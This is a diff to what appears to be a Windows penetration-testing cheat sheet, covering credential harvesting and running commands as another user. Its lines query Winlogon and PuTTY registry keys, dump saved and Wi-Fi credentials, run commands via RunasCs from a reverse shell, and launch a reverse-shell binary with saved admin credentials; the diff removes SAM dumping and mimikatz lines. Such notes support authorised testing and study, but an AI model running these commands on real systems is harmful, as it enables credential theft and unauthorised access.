@@ -13,10 +13,9 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Defaul
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"     # saved proxy/host
 # Stored / Wi-Fi / browser
 cmdkey /list ; netsh wlan show profile name=X key=clear
-# LSASS / SAM
-reg save hklm\sam sam ; reg save hklm\system system   # -> secretsdump (above)
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"
 ```
+
+For SAM, LSA, LSASS, and cached material, follow [Windows credential access](credential-access.md).
 
 ## Run as another user with creds (RunasCs: no interactive desktop needed)
 From a reverse shell, use RunasCs (plain `runas` needs an interactive desktop):
@@ -29,6 +28,5 @@ From a reverse shell, use RunasCs (plain `runas` needs an interactive desktop):
 Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain corp.example
 ```
 Alternate data streams: `dir /R`, `more < file:stream`, `type ... > file:hidden`.
-- **machineKey / ViewState:** a leaked `web.config` machine key can undermine ViewState protection. Check the application's signing settings and the actual server-side parser before claiming code execution.
 - **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
 - UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).
